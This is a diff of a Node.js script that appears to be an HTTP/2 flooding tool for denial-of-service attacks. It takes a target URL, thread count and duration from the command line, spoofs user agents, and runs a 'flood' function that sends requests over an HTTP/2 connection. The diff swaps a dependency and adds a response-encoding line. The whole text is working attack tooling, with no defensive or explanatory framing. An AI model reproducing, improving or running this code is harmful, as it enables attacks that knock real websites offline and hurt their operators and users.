@@ -2,12 +2,11 @@ const cluster = require("cluster")
 const https = require("https")
 const http = require("http")
 const fakeua = require("fake-useragent")
-const randomstring = require("randomstring")
+const tls = require("tls")
 const http2 = require("http2")
 const target = process.argv[2]
 const thread = process.argv[3]
 const time = process.argv[4]
-const reqData = randomstring.generate(40)
 if ( process.argv.length < 5 ) {
 	console.log("Using: node http2 [target] [thread] [time]")
 	process.exit();
@@ -2204,6 +2203,7 @@ const options = {
 const client = http2.connect(target)
 function flood() {
 	const req = client.request(options)
+	req.setEncoding('utf8')
 	req.on("response", () => {
 		req.end()
 		return
